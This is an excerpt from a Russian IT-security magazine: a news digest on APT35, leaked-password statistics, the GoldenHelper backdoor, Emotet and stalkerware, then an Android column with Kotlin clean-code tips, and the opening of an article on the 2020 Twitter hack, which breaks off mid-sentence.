     Аналитики IBM  X‐Force  отмечают дотошность  злоумышленников:  те
  получают доступ буквально к каждой учетной записи жертвы, независимо
   от того, насколько незначителен тот или иной профиль. В итоге взлому под‐
  вергалось все: сервисы потоковой передачи видео и музыки, дос тавка пиц‐
   цы, сервисы финансовой помощи студентам и муниципальных коммунальных
   услуг, банкинг, аккаунты в видеоиграх, учетные записи операторов связи...
    Суммарно операторы APT35 попытались скомпрометировать аккаунты
   как минимум на 75 различных сайтах, взламывая всего двух человек. Если
  взлом удавался, хакеры заглядывали в нас тройки учетной записи и искали
  там любую личную информацию, которая отсутс твовала в других аккаунтах,
   чтобы в итоге составить максимально подробный профиль для каждой жер‐
   твы.
     Эксперты не сооб щают, как именно хакеры получили учетные данные сво‐
   их целей. Возможно, пользователи были заранее заражены мал варью,
  которая похищала пароли, а может быть, учетные данные были попросту куп‐
  лены на черном рын ке.
    В других видеоро ликах хак‐группы демонс трируется поэтапное хищение
  данных из каждой учетной записи. В том числе экспорт всех контактов, фотог‐
  рафий и докумен тов из облачных хранилищ, таких как Google Drive. В некото‐
  рых случаях злоумышленники даже обра щались к утилите Google Takeout, что‐
  бы извлечь все содержимое чужого аккаунта Google, включая историю мес‐
  тоположений, данные из Chrome и свя занных устройств на базе Android.
    В конце, когда все остальное сделано, хакеры добавляли учетные данные
   электронной почты жертвы в Zimbra, что позволяло им удаленно контролиро‐
   вать сразу несколько учетных записей из одной бэкенд‐панели.


                                        Продолжение статьи →
← Начало статьи





  Помимо этого, были обнаружены видео, на которых члены APT35 создают
  специальные учетные записи электронной почты. Исследователи считают, что
  хакеры воспользуются этими акка унтами в будущих операциях.
     Эксперты пишут, что им удалось идентифици ровать и уведомить о компро‐
  метации несколько жертв зло умышленников, которых хакеры взламывали
  на видео, в том числе военнослужащего ВМС США, а также офицера ВМС
  Греции. На видео попали и неудачные попытки получить доступ к учетным
  записям чиновников из Госдепартамента США, взлому которых помешала
   двухфакторная аутентификация.


 НЕНАДЕЖНЫЕ ПАРОЛИ
   Турецкий студент и незави симый исследователь Ата Хакчел (Ata Hakçıl) про делал титаническую
   работу, изучив более 1 000 000 000 логинов и паролей. Столь огромный дамп для анализа он
   собрал из открытых источников: все эти дан ные ког да‐то утекли в сеть в результате ИБ‐инци‐
   дентов. Исследователь приводит множество интерес ных статис тичес ких данных.

  В подборке удалось выявить 168 919 919 уникальных паролей и 393 386 953 име ни поль‐
   зователей.

   Как оказалось, более 7 000 000 из них — это пароль 123456 (каждый сто сорок второй
   пароль, встречается в 0,722% случаев).

   Средняя длина пароля составляет 9,48 символа, хотя ИБ‐эксперты обычно рекомендуют
   использовать более длинные пароли (от 16 до 24 символов).

   Сложность паролей тоже оказалась проблемой, пос кольку лишь 12% паролей от обще го числа
   содержат хотя бы один специаль ный символ.


  В подавляющем большинстве случаев пользователи выбирают максимально простые пароли:
   используют только буквы (29%) или только цифры (13%).

   Примерно 42% всех паролей уязвимы для банальных словарных атак и перебора.

   1000 самых распространенных паролей — это примерно 6,607% от всех изучен ных паролей.

   34,41% всех паролей заканчиваются цифрами, но только 4,522% паролей начинаются
   с цифр.





 ВТОРОЙ КИТАЙСКИЙ
 БЭКДОР
  В июне 2020 года специалисты компании Trustwave рассказали, что неназ‐
  ванный китайский банк вынуждал западные компании устанавливать офи‐
  циальное налого вое ПО, содержащее бэкдор GoldenSpy. Вызвавшая подоз‐
  рения экспертов программа называлась Intelligent Tax и была разработана
  подразделением Golden Tax, относящимся к Aisino Corporation, спе циально
  для уплаты местных налогов.
     Вскоре после публикации отчета экспертов стало известно, что бэкдор
  GoldenSpy был тихо уда лен из программы.
     Теперь же специалисты Trustwave сооб щают, что GoldenSpy оказался
  не первым. Так, исследова тели обна ружи ли, что в другом налоговом ПО,
  Golden Tax Invoicing Software (Baiwang Edition), скрывалась мал варь Golden‐
   Helper. Данную программу зарегистрированные в Китае компании обязаны
   устанавливать, так как она необ ходима для выставления счетов и уплаты
  налогов на добавленную стоимость (НДС).
     Данное ПО тоже было свя зано с подразделени ем Aisino Corporation: Gold‐
   enHelper  оказался  подписан  цифровой  подписью  с  использованием
  доверенного сертификата, выданного NouNou Technologies — дочерней ком‐
  пании Aisino Corporation. При этом в настоящее время в Китае только два
  официальных поставщика налоговых программ: Aisino и Baiwang. И вредонос‐
  ный код GoldenHelper был обна ружен в прог рамме авторства Baiwang.





               Запутанные отношения между китай ски ми компаниями

  Иногда программа пос тавлялась отдельно, но некоторые пользователи
  заявили, что в их версии Windows 7 Home Edition сразу была установлена
   (скрытая) копия GoldenHelper.
    В целом GoldenHelper похож на GoldenSpy и тоже представляет собой
  опасный бэкдор. Так, он может устанавливаться в систему без согласия поль‐
  зователя, повышать привилегии до уровня SYSTEM, а затем загружать и уста‐
  навливать на зараженную машину допол нительные пейлоады. При этом мал‐
  варь обходит защитный механизм User Account Control в Windows, который
  обычно просит поль зователя выдать конкретному ПО разрешения на уста‐
  новку других программ и внесение изменений в сис тему.
     Эксперты рассказывают, что GoldenHelper исполь зует SKPC.DLL для вза‐
  имодействия с Golden Tax, WMISSSRV.DLL для повышения привилегий и файл
   .DAT со случайным именем для выбора и запуска произвольного кода с при‐
  вилегиями SYSTEM. Основная цель этой малвари заключается в том, чтобы
   загрузить и запустить taxver.exe, но специалис ты не смогли найти акту альный
  образец фактической полезной нагрузки.





  Дело в том, что кампания GoldenHelper была активна в 2018–2019 годах, а в
  настоящее время, похоже, уже завершилась. Частота обнаружения образов
  мал вари, задействованных в этой кампании, воз росла в середине 2019 года,
  и это, по всей видимости, вынудило хакеров свернуть опе рацию, а сроки
  регистрации   доменов   управляющих   серверов   истекли  еще   в
  начале 2020 года.





  В целом GoldenHelper был способен:
   • использовать случайно сгенерированные имена файлов;
   • генерировать случайные временные мет ки creation и last write;
   • загружать исполняемые файлы с использовани ем поддельных имен фай‐
     лов с расширениями .gif, .jpg и .zip;
   • использовать DGA на основе IP, чтобы на лету изменять адрес управля‐
    ющего сервера.

  Хотя исследователям не уда лось доказать, что taxver.exe — это действитель‐
  но мал варь, они отмечают, что легитимное ПО обычно не обходит средс тва
  защиты Windows для повышения привилегий, не рандомизирует свое мес‐
  тоположение, не скрывает свое имя, не пытается вносить изме нения в записи
  DNS и так далее.
     Эксперты Trustwave резюмируют, что GoldenHelper, очевидно, был пред‐
  шественником GoldenSpy:



         «За кам панией GoldenHelper пос ледова ла GoldenSpy, и мы не сом-
         нева емся в том, что эта угроза продолжит эволюционировать в новую
        методологию, нацеленную на пред приятия, работа ющие в Китае».


  62 000 QNAP NAS ПОД АТАКОЙ

   Малварь QSnatch, появившаяся на свет еще в 2014 году, лишь в последний год стала представ‐
   лять реальную угрозу. QSnatch сочетает в себе функциональность бэкдора и инфостилера
   и атакует устройства Qnap NAS.

   Осенью 2019 года сообщалось, что вредонос заразил 7000 устройств в одной только Гер‐
   мании, но по состоянию на середину июля 2020 года число атакованных NAS по всему миру
   превысило 62 000. Эксперты CISA и NSCS сообщают, что пример но 7600 зараженных устрой‐
   ств находятся в США и около 3900 в Великобритании.

   Компания QNAP давно объяснила, как обезопасить устройства от атак QSnatch, и призывает
   пользователей и администраторов предпринять необходимые для защиты меры.





 EMOTET СНОВА
 В СТРОЮ
  Один из наиболее активных бот нетов 2019 года — Emotet не подавал почти
   никаких признаков жизни с февраля текущего года. Но в июле ИБ‐эксперты
  предупредили, что Emotet вернулся в строй с новой спам‐кампани ей.
    Новая кампания нацелена преимущес твенно на пользователей из США
  и Великобритании, а письма‐приманки написа ны на английском языке. Пос‐
  лания злоумышленников содержат либо документы Word, либо URL‐адреса,
  ведущие к загрузке таких файлов (обычно раз меща ющихся на взломанных
  сайтах на базе WordPress). Подобные документы опасны из‐за вредоносных
  макросов, которые (если они вклю чены), в итоге при водят к загрузке и уста‐
  новке Emotet.
    Понаблюдав за малварью, ИБ‐специалис ты пришли к выводу, что ботнет
  сменил основную полез ную наг рузку и теперь распространяет банковский
  троян QakBot (QBot), который пришел на смену обычному для ботнета
   TrickBot.
     Впрочем, пейлоады Emotet менялись и рань ше, и, скорее всего, ори‐
   гинальный тандем Emotet — TrickBot вскоре тоже вернется в строй. Дело
   в том, что иссле дователи называют TrickBot и QakBot предпочтительными
  партнерами для Emotet, так как все три груп пировки входят в одно русско‐
  язычное сообщество и давно общаются между собой.
     Кроме  того,  вредонос  обзавелся  новой функциональностью:  начал
  похищать списки контактов, содержимое и вложения из писем своих жертв,
   чтобы рассылаемый спам выглядел как можно аутентичнее для следующих
  получателей.
    Новая тактика позволяет операторам Emotet эффективно использовать
  перехваченные электронные пись ма и «включаться» в раз говоры пользовате‐
   лей. То есть вредоносный URL‐адрес или вложение в итоге будут выглядеть
   как новые сообщения в уже иду щей дискуссии. Причем, в отличие от других
  злоумышленников, операто ры Emotet используют не только само «тело» укра‐
  денных посланий, но и вло жения из них.
    Интересно, что при этом работу активизи ровавшегося ботнета саботи‐
  руют неизвестные доб рожелатели, которые подменяют полез ные нагрузки
  Emotet анимированными файлами GIF, эффективно предотвращая заражение
   жертв. Неясно, кто именно стоит за этой акцией, это могут быть как кон‐
   курирующие хак‐группы, так и неизвестный ИБ‐специалист.
     Из‐за этого в 20‐х числах июля около четверти всех пейлоадов Emotet
  были подменены гифками, что вызвало значитель ное снижение активности
  ботнета.
     Такой саботаж стал возможен бла годаря тому, что полезные нагрузки бот‐
   нет размещает преимущественно на взломанных сайтах на базе WordPress,
  доступ к которым операторы Emotet получают через веб‐шеллы. Ранее
  эксперты уже обнаруживали, что зло умышленники используют для этих целей
  решения с открытым исходным кодом, а также применяют одинаковый пароль
  для всех веб‐шеллов, тем самым подвергая свою инфраструктуру риску.
     Теперь же, судя по всему, кто‐то сумел узнать тот самый пароль, одинако‐
  вый для всех веб‐шеллов, и не преминул этим воспользоваться. Эти «добрые
  самаритяне» заменяют полезные нагрузки Emotet на взломанных WordPress‐
  сайтах анимированными файлами GIF. Файлы они обычно берут с Imgur
  или Giphy.


 НАСИЛИЕ И СТАЛКЕРСКОЕ ПО
   Аналитики компании Avast предупредили, что в период каран тина, с марта по июнь 2020 года,
   использование шпионских программ (в том чис ле и тех, которые установлены незаметно
   от пользователя) в мире увеличилось на 51% по сравнению с январем — фев ралем 2020 года.
  В России с марта 2020 года Avast защитил от stalkerware более 1094 пользовате лей.

   Увы, этот печальный тренд не ограничивается Рос сией: Avast защитила от stalkerware более
  43 000 пользователей по все му миру. Нап ример, в Соединенных Штатах подобные программы
   были нацелены на 3531 пользователя, 1648 во Франции и 3048 в Бразилии.





   Эксперты Avast Threat Labs отме чают корреляцию активнос ти stalkerware с ростом физического
   насилия в семьях во время карантина. Нап ример, директор кризис ного цен тра «Анна» в России
   сообщила, что в марте пострадавшие от домашнего насилия обращались в кризисные цен тры
   чаще на 25%. В мае 2020 года количес тво звонков на всероссийский телефон доверия
   для женщин выросло на 74% по сравнению с февралем.

   Исполнительный директор «ООН‐жен щины» Фумзиле Млам бо‐Нгкука и вовсе назвала происхо‐
   дящее «теневой эпидемией» коронавируса.





 РАБСТВО В LINUX
  В прошлом месяце мы рассказывали о том, что под влиянием протестов
   Black Lives Matter, прокатившихся по всей территории США (и не только), IT‐
  сообщество вернулось к обсуждению вопросов неуместной и оскорбитель‐
  ной терминологии. В настоящее время мно гие разработчики прилагают уси‐
   лия, чтобы удалить подоб ные тер мины из сво его исходного кода, приложений
  и онлайн‐сервисов.
    Подобные изменения обычно включают в себя отказ от использования
  терминов master и slave («хозя ин» и «раб») в пользу таких альтернатив,
   как main, default, primary и, соот ветс твенно, secondary. Также устоявшиеся
  понятия whitelist и blacklist, то есть черный список и белый список, заменяют
  на нейтральные allow list и deny/exclude list («список разрешений» и «список
  запретов/исклю чений»).
     К примеру, о намерении подыскать альтернативы для whitelist/blacklist
   в последнее время сооб щили разработчики Android, язы ка программирова‐
  ния Go, библиотеки PHPUnit и утилиты Curl. В свою очередь, авторы проекта
  OpenZFS уже работают над заменой тер минов master/slave, использующихся
  для описания связей между средами хра нения.
     Также в начале июля об изменениях такого рода сообщили разработчики
  компаний Microsoft, LinkedIn, Google и Twitter. Все они обе щали изме нить тех‐
  нический язык своих продуктов и инфраструктуры и избавиться от слов вроде
   master, slave, blacklist, whitelist.
     Стоит отдельно отметить, что компания Twitter пошла дальше других и соч‐
  ла некорректным использование даже  таких терминов,  как man  hours
   («человеко‐часы»; пред лага ется заменить на «персоно‐часы») или  sanity
  check («проверка работоспособности» или, в дру гом контексте, «санитарная
  проверка»; предлагается заменить на «быструю про верку», так как слово sani‐
   ty в английском языке может относиться и к психичес кому здоровью, а термин
  может читаться как «проверка на вменяемость»).
    В прошлых материалах мы уже упомина ли о том, что разработчики Linux
  тоже не остались в стороне и обсуждение инклю зивной терминологии велось
  уже довольно давно. Как стало извес тно в середине июля, вопрос наконец
  был решен: Линус Торвальдс сделал соответс твующий коммит и утвердил
  новую политику проекта в отно шении оформления кода в ветке ядра Linux 5.8
   (хотя изначально изменения предлагалось внес ти в ветку 5.9).
     Третья редакция текста была одобрена 21 известным разработчиком
   ядра, включая членов Linux Foundation. В итоге было решено отказаться
   от использования таких понятий, как master/slave и blacklist/whitelist, а также
  не использовать слово slave отдельно.
    Ожидается,  что новые пра вила  будут при меняться  к новому  коду,
  а ревизию  старого пока проводить не планируют,  хотя разработчики
  не исключают, что в ито ге переименование затронет и немалую часть сущес‐
   твующего кода. Устаревшие термины раз решено использовать лишь в случае
  необходимости.
    В различных контекстах термины master/slave теперь рекомендовано
  заменять следующими ана лога ми:
   • primary, main/secondary, replica, subordinate;
   •  initiator, requester/target, responder;
   • controller, host/device, worker, proxy;
   • leader/follower;
   • director/performer.

  В свою очередь, термины blacklist/whitelist совету ют заменять более ней‐
   тральными версиями:
   • denylist/allowlist;
   • blocklist/passlist.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА
    Twitter МИД РФ взломали. Он рекламировал продажу БД с дан ными россиян


  Обнаружена связь между китайской хак‐группой и оборонным подрядчиком


   Сотрудник Yahoo, шпионивший за пользователями, избежал тюрьмы


   Google открыла исходный код сканера уязвимостей Tsunami


   Российский хакер, взломавший Dropbox и LinkedIn, признан виновным


   Атака BadPower может заставить устройства загореться


   Тысячи БД пострадали от мяу‐атаки


   Стивен Возняк подал в суд на YouTube из‐за крип товалютных мошенников


   Сервисы компании Garmin отключились в результате атаки шифровальщика


   Уязвимость BootHole угрожает системам, использующим GRUB2 и Secure Boot
HEADER
ANDROID

НОВЫЕ ЗАПРЕТЫ
И ЧИСТЫЙ КОД
НА KOTLIN





Сегодня в выпус ке: ответы Android engi‐
neering team на вопросы пользователей
Reddit, запрет на доступ к сторонним при‐
ложениям в новых версиях Android, спо соб
предотвратить клонирование приложения,          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
множес тво советов, как писать чистый код              zobnin@glc.ru
на Kotlin, рассказ о функции with из уст раз‐
работчиков  Koltin,  польза и  вред  фун‐
кций‐расширений. А также: очередная пор‐
ция библиотек и инструментов пентестера.


                ПОЧИТАТЬ


Разработчики Android отвечают на вопросы
Android engineering team QA — ежегодная сессия вопросов и ответов коман‐
ды разработчиков Android на Reddit. Как обычно, вопросы банальные, а отве‐
ты обтекаемые. Но есть несколько интересных моментов.
 1. С Android 11 производители будут обязаны сооб щать пользовате лям, что
   их прошивка может убить приложение и не дать ему работать в фоне. Так‐
  же в прошивке дол жна быть возможность отключить такое поведе ние.
  Кроме того, производителям придется убрать из своих прошивок белые
   списки популярных приложений, которые могут работать в фоне. В теории
   все это должно смягчить проблему некорректной работы приложе ний
   на китайских смартфо нах.
 2. В Android 11 появился API, позволя ющий узнать, почему приложение было
   завершено. Это  опять же  поз волит  выяснить,  почему  приложение
   на самом деле было завершено и свя зано ли это с некорректны ми дей‐
   ствиями прошив ки.
 3. В Android 11 появился сервис I/O Read Ahead Process (IORap), который
   выполняет предваритель ную загрузку нужных приложению ресурсов и дан‐
   ных во вре мя старта приложения. Это дало прирост скорости холод ного
   запуска в 5–20%.
 4. Еще один интересный API Android 11 — Data Access Auditing API, позволя‐
  ющий получить информа цию о том, какие при ватные данные пользователя
   (местоположение, кон такты и так далее) ста новятся доступны при ложе‐
   нию. Это API для раз работчиков, жела ющих выяс нить, обращаются ли сто‐
   ронние библиотеки или legacy‐код к приватным данным пользовате ля.
  Подробности — в блоге Android Developers.


Запрет на доступ к приложениям
Package visibility in Android 11 — статья разработчиков Android о новом запрете
Android 11, благодаря которому сторонние приложения больше не смогут
получать информацию или запускать любое уста новленное на смартфон при‐
ложение.
  Напомню, что до версии 11 Android предоставлял впол не официальный API
для получения информа ции обо всех уста новленных на смартфон приложе‐
ниях (имя, версия, время установки и так далее) и не налагал никаких зап‐
ретов на запуск любых приложений. Этим пользовались не только сторонние
менеджеры приложений, панели быс трого запус ка и другой полезный софт,
но и разного рода мал варь и недобросовестные разработчики, сливающие
информацию на третью сторону.
  Начиная с Android 11 сис тема будет огра ничивать доступный приложению
список установ ленных приложений и обяжет разработчиков перечислять при‐
ложения, с которыми приложение автора хочет контакти ровать, в манифесте:


<manifest package="com.example.game">
  <queries>
    <package android:name="com.example.store" />
    <package android:name="com.example.service" />
  </queries>
  ...
</manifest>

Кроме самих приложений, также можно перечис лить типы интентов, которые
собирается использовать приложение (в следующем примере приложе ние
заявляет о своем намерении делиться изоб ражени ями с другими приложе‐
ниями):


<manifest package="com.example.game">
  <queries>
    <intent>
      <action android:name="android.intent.action.SEND" />
      <data android:mimeType="image/jpeg" />
    </intent>
  </queries>
  ...
</manifest>

Эти требования будут рас простра нять ся на все приложения, собранные
для API 30 и выше (targetSdkVersion=30), и не кос нутся уже существующих
приложений, до тех пор пока в Google Play не будет введен минимальный уро‐
вень API 30.
  Для лаунчеров и других приложений, которым необходим дос туп ко всем
установленным приложениям, предус мотрено новое раз решение QUERY_AL‐
L_PACKAGES. Но для его использования при дется проходить ручную пре‐
модерацию.


              РАЗРАБОТЧИКУ


Чистый код на Kotlin
Write ﬂuent code in Kotlin — статья с советами о том, как сделать код на Kotlin
более понятным для чтения.


1. Используй require и check

require(arg.length < 10) {
    "message"
}


val result = checkNotNull(bar(arg)) {
    "message"
}


/// вместо ///


if (arg.length < 10) {
    throw IllegalArgumentException("message")
}


val result = bar(arg)
    ?: throw IllegalStateException("message")


2. Используй функции вместо комментариев

val user = getUser(id)
validate(user)
activate(user)


private fun validate(user: User) {
   // код валидации
}


private fun activate(user: User) {
   // код активации
}


/// вместо ///


val user = getUser(id)


/*
 * Validate user
 */
// код валидации


/*
 * Activate user
 */
// код активации


3. А лучше — функции-расширения

private fun User.validate(): User {
   // код валидации
   return this
}


private fun User.activate(): User {
   // код активации
   return this
}


...


val user = getUser(id)
   .validate()
   .activate()


4. Инфиксные функции делают код более легким для чтения

val x = mapOf(1 to "a")
val range = 1 until 10
val loop = listOf(...) zip listOf(...)


/// вместо ///


val x = mapOf(1.to("a"))
val range = 1.until(10)
val loop = listOf(...).zip(listOf(...))

Делай функции инфик сными, если:
 • функция не имеет побочных эффектов;
 • имеет простую логику;
 • имеет короткое имя;
 • используется в местах, где скобки будут мешать чтению.


5. Используй функции with, apply и also

...какой‐то код...
with(foo.id) {
   LOGGER.info("id is $this")
   doSomething()  // method of id
   doSomethingElse(this)
}
...какой‐то код...


/// вместо ///


...какой‐то код...
val id = foo.id
LOGGER.info("id is $id")
id.doSomething()
doSomethingElse(id)
...какой‐то код...


6. Не указывай тип там, где его можно не указывать

val x = "a"
override fun foo() = 1


/// вместо ///


val x: String = "a"
override fun foo(): Int = 1

Исключения:
 • возвращаемый функцией тип слишком слож ный, например Map<Int,
  Map<String, String>> ;
 • когда вызываешь функции, не имеющие nullable‐аннотации (например,
   обычные функции Java).


7. Используй присваивание при создании функции, состоящей из
одного выражения

fun foo(id: Int) = getFoo(id)
   .chain1()
   .chain2()
   .chain3()
   .chain4 {
      // лямбда
   }


/// вместо ///


fun foo(id: Int): Bar {
    return getFoo(id)
      .chain1()
      .chain2()
      .chain3()
      .chain4 {
         // лямбда
      }
}


8. Typealias упростит работу со сложными типами

typealias CustomerId = Int
typealias PurchaseId = String
typealias StoreName = String
typealias Report = Map<CustomerId, Map<PurchaseId, StoreName>>


fun(report: Report) = // ...


/// вместо ///


fun(report: Map<Int, Map<String, String>>) = // ...


9. Используй метки точности для уточнения типа присваиваемого
значения

val x = 1L
val y = 1.2f


/// вместо ///


val x: Long = 1
val y: Float = 1.2


10. Пользуйся подчеркиванием, чтобы сделать длинные числа
более читаемыми

val x = 1_000_000


/// вместо ///


val x = 1000000


11. Применяй интерполяцию строк, чтобы сделать их более
читаемыми

val x = "customer $id bought ${purchases.count()} items"
val y = """He said "I’m tired""""


/// вместо ///


val x = "customer " + id + " bought " + purchases.count() + " items"
val y = "He said "I’m tired""


12. Используй оператор ? для возврата управления

val user = getUser()
   ?: return 0


/// вместо ///


val user = getUser()
if (user == null) {
   return 0
}


13. Применяй тип Sequence для оптимизации обработки очень
длинных списков (более 1000 элементов)

listOf(1).asSequence()
   .filter { ... }
   .map { ... }
   .maxBy { ... }


/// вместо ///


listOf(1)
   .filter { ... }
   .map { ... }
   .maxBy { ... }


14. Используй обратные кавычки при написании имен тестов

fun `test foo ‐ when foo increases by 3% ‐ returns true`() { ... }


/// вместо ///


fun testFoo_whenFooIncreasesBy3Percent_returnsTrue() { ... }


Kotlin и функция with
With the receiver in scope — заметка Романа Елизарова из команды раз работ‐
чиков Kotlin о ключевой функции with.
  Представь, что у тебя есть следующий код:


applicationWindow.title = "Just an example"
applicationWindow.position = FramePosition.AUTO
applicationWindow.content = createContent()
applicationWindow.show()

Несмотря на корректность и в целом удовлетворительную читаемость, код
выглядит громоздким. Его долго печатать, дол го читать, и легко допустить
ошибку (нап ример, если у тебя есть еще один объект с похожим на applica‐
tionWindow име нем). Исполь зуя with, мы можем решить все эти проблемы:


with(applicationWindow) { // this: ApplicationWindow
    title = "Just an example"
    position = FramePosition.AUTO
    content = createContent()
    show()
}

Этот код на две строки длиннее, но он гораздо понятнее. Любой читающий
этот код человек сразу видит, что все содержимое фигурных скобок относит‐
ся к объекту applicationWindow.
  А самое инте ресное, что столь полезный инс трумент — это вовсе не часть
языка, не ключевое сло во, а функция, состоящая всего из одной строки:


fun <T, R> with(receiver: T, block: T.() ‐> R): R =
    receiver.block()

По сути, эта функция просто запускает весь код в блоке в контексте указан‐
ного объекта, так же как это делают функции‐рас ширения.
  И тут назревает вопрос: если подоб ная функциональность настолько
удобна и полезна и так легко реализуется, почему бы не использовать ее вез‐
де? Например, почему бы не делать то же самое в методах forEach, filter,
map и других?
   Чтобы ответить на этот вопрос, приведем два фраг мента кода. Первый:


persons.filter { it.firstName == name }

Второй:


persons.filter { firstName == name }

В первом фрагменте мы используем метод filter так, как он реализован
в Kotlin сейчас. Во втором — так, как он мог бы быть реализован при исполь‐
зовании внутри функции with. Обрати вни мание, что код не стал более чита‐
емым. Напротив, он вводит в заблуждение. Что такое name? Это объ явленная
ранее переменная или поле, принадлежащее объекту, с которым мы работа‐
ем?
  Функция with может быть очень полезна в одних случаях и пол ностью раз‐
рушать читаемость и открывать прос тор для ошибок — в других.


Функции-расширения: использовать или нет?
Kotlin dilemma: Extension or Member — статья о том, в каких случаях стоит
использовать функции‐расширения, а в каких нет.
  Функции‐расширения — это методы, которые можно добавить к любому
классу вне зависимости от того, имеешь ты доступ к его исходному коду
или нет. Например:


fun String.isPalindrome() : Boolean {
    //...
}


val str = "aabbaa"
val result = str.isPalindrome()

Это весьма удоб ный инстру мент, который при неправильном использовании
может принести массу проб лем. В основном эти проблемы возникают, когда
разработчики пытаются использовать функции‐расширения в собственных
классах вместо создания стандартных методов. Есть всего несколько при‐
меров, когда это может быть оправданно.
 1. Inline‐функции. Существу ет извес тная рекомендация, что функции выс‐
  шего порядка стоит помечать с помощью ключевого слова inline. Тогда
   компилятор включит их код пря мо на мес то вызова, вместо того чтобы
   делать настоящий вызов. Kotlin не позволяет делать инлайновыми методы
   класса, но позволяет делать инлайновыми функции‐расширения.
 2. Объект со значением  null. В отличие от классических методов, фун‐
   кции‐расширения можно создать даже для nullable‐типов. Например:


fun CharSequence?.isNullOrBlank(): Boolean {
    // ...
}


val str : String? = "I am nullable"
assertThat(str.isNullOrBlank()).isFalse()


Как предотвратить клонирование приложения
Preventing Android App Cloning — статья о том, как предотвратить установку
двух экземпляров приложения на устройство.
  Некоторые производите ли встра ивают в свои про шивки функцию клониро‐
вания приложения (например, Parallel Apps в OnePlus, Dual Apps в Xiaomi),
которая позволяет установить на смартфон копию какого‐либо приложения.
Прошивка создает дополнительного Android‐пользователя с идентифика‐
тором 999 и устанавливает копию приложений от его имени.
   Такую же функциональность предлагают некоторые при ложения из мар‐
кета (Dual Space, Clone App, Multi Parallel). Они работа ют по‐другому: создают
изолированную среду для приложения и уста навливают его в собственный
приватный каталог.
  И тот и другой способ могут сло мать нормальное функционирование при‐
ложения, если не совпадают раз решения на дос туп к той или иной функци‐
ональности или файлам. Например, приложение не сможет получить доступ
к стандартному каталогу загрузок. Поэтому в некоторых слу чаях такое кло‐
нирование стоит запретить.
  Сделать это можно с помощью анализа пути к приватному каталогу при‐
ложения. К примеру, приложение  с именем  пакета  com.example.app
при нормальной установке будет иметь при ват ный каталог по следующе му
пути:


/data/user/0/com.example.app/files

При создании клона с помощью одного из приложений из маркета путь будет
уже таким:


/data/data/com.ludashi.dualspace/virtual/data/user/0/com.example.app/
files

А при создании кло на с помощью встроенных в прошивку инстру ментов —
таким:


/data/user/999/com.example.app/files

Автор статьи предлагает анализировать этот путь и проверять его либо
на количество точек, либо на наличие цифры 999. Я переписал его громоз‐
дкий Java‐код на Kotlin:


private const val DUAL_APP_ID_999 = "999"


fun checkAppCloning(context: Context): Boolean {
    val path: String = context.filesDir.path
    val packageName = context.packageName


    val pathDotCount = path.split(".").size‐1
    val packageDotCount = packageName.split(".").size‐1


    if (path.contains(DUAL_APP_ID_999) || pathDotCount >
packageDotCount) {
        return false
    }


    return true
}


             ИНСТРУМЕНТЫ


 • Crylogger — инструмент, который помога ет найти неправильное исполь‐
   зование функций криптогра фии в приложениях;
 • Slicer — утилита для быстрого ана лиза при ложений;
 • Adb‐event‐mirror — утилита, копиру ющая события ввода с одного устрой‐
   ства на другое (можно использовать для симуляции нажатий на двух
   устройствах одновременно);
 • Uninstall.py — скрипт Frida для удаления с устройства всех приложе ний,
  имеющих права админис тра тора устройства.


              БИБЛИОТЕКИ


 • MarkdownEditText — Markdown‐редактор;
 • CornerSheet — view, выезжающий из угла;
 • BlobBackgroundLayout — layout с анимированными каплями на фоне;
 • Beagle — фреймворк для создания при ложений с Server‐Driven UI;
 • Luch — библиотека для монито ринга Bluetooth‐маячков;
 • PianoView — интерактивное пианино;
 • Phrase —  библиотека   для  быстро го   перевода   с  помощью
   онлайн‐переводчиков (Google Translate или DeepL);
 • TickTock — библиотека для управления часовы ми поясами;
 • PINkman — аутентифика ция с помощью PIN‐кода;
 • Khome — биб лиотека для управления умным домом, построенным на базе
  Home Assistant;
 • AndroidBottomBar — очередная панель навигации в нижней час ти экрана;
 • Unearthed — библиотека, поз воля ющая узнать, сколько раз приложение
  было убито и перезапущено;
 • TextWriter — TextView с анимацией появления букв.
HEADER

 ХРОНИКА АТАКИ
НА TWITTER





                                 Мария «Mifrill» Нефёдова
                                                  nefedova@glc.ru





        КАК ПОЙМАЛИ ХАКЕРОВ,
   ВЗЛОМАВШИХ СОЦИАЛЬНУЮ СЕТЬ





В середине июня 2020 года компания Twitter подверглась
самой масштабной атаке за всю историю своего существо‐
вания. Разбираемся, что известно о взло ме, а также изучаем
судебные  документы,  которые  про ливают  свет  на  то,
как арестовали подозрева емых в этой атаке.


ВЗЛОМ
В середине июня 2020 года компания Twitter пострадала от самой масштаб‐
ной атаки за всю историю своего существо вания. Компрометации подвер‐
глось множество аккаунтов публичных людей, компаний, криптовалютных
бирж. Так, сре ди постра давших были: Билл Гейтс, Илон Маск, Джефф Безос,
Джо Байден, Барак Обама, Уоррен Баффет, Канье Уэст, Ким Кардашьян, ком‐
пании Apple и Uber, крупнейшие крип товалютные биржи CoinDesk, Binance
и Gemini.





            Взло манные акка унты. Фото: Bleeping Computer

Полученным доступом  к топовым  аккаунтам  злоумышленники восполь‐
зовались весьма странным образом: объявили аттракцион неслыханной щед‐
рости и устроили фаль шивую раздачу биткойнов. Мошенники действовали
по классической скамерской схеме: от лица извес тных людей и крупных ком‐
паний они просили прис лать им небольшое количес тво криптовалюты, обе‐
щая удвоить и вернуть любую полученную сумму.
   Как ни парадоксально, но даже в 2020 году нашлось немало людей,
которые поверили, что Билл Гейтс, Илон Маск и другие известные компании
и личности вдруг начали раз давать биткойны. В итоге таким образом мошен‐
ники «заработали» примерно 13 BTC, то есть около 120 тысяч долларов.
  Причем жертв могло быть и больше, если бы крупные криптовалютные
биржи своевременно не заблокиро вали злоумышленников. К примеру, биржа
Coinbase помешала 1100 своим клиентам перевес ти 30,4 BTC — око‐
ло 280 тысяч долларов по текущему курсу. Лишь 14 пользовате лей Coinbase
успели отправить криптовалюту на адрес мошенников (на общую сумму око‐
ло 3000 долларов), прежде чем специалисты внесли его в черный список.
  Другие биржи, в том числе Gemini, Kraken и Binance, тоже сообщили, что
блокировали переводы средств на кошелек хакеров, хотя их пользователи
совершили гораздо меньше попыток транзакций, чем пользовате ли Coinbase.


УЩЕРБ
По состоянию на начало августа извес тно, что ата ка затронула сравнительно
небольшое количество учетных записей. Взлом кос нулся лишь 130 аккаунтов,
и для 45 из них были успешно сброшены пароли — от лица этих учетных
записей взломщики размещали мошенничес кие сооб щения.
  Еще для семи учетных записей злоумышленники скачали все дос тупное
